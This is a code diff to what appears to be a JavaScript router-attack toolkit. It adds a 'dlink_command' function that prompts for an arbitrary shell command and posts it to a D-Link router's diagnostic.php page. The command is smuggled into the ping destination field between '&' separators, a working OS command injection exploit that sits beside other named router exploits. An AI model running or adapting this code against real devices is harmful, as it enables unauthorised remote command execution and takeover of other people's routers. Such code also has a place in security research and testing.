@@ -2163,6 +2163,17 @@ function i230w_auth(ip)
 	post('http://' + ip + '/GponForm/LoginForm', form);
 }
 
+// Multiple DLINK OS Command Injection
+function dlink_command(ip)
+{
+	ip = ip || "192.168.1.254";
+
+	cmd = prompt("Command:");
+	form = '<input value="index" name="act" value="ping" />\
+	<input value="index" name="dst" value="&'+ encodeURI(cmd) + '&"/>' ;
+	post('http://' + ip + '/diagnostic.php', form);
+}
+
 // Alcatel Lucent I-240W-Q - Command Execution
 function i240w_command(ip)
 {
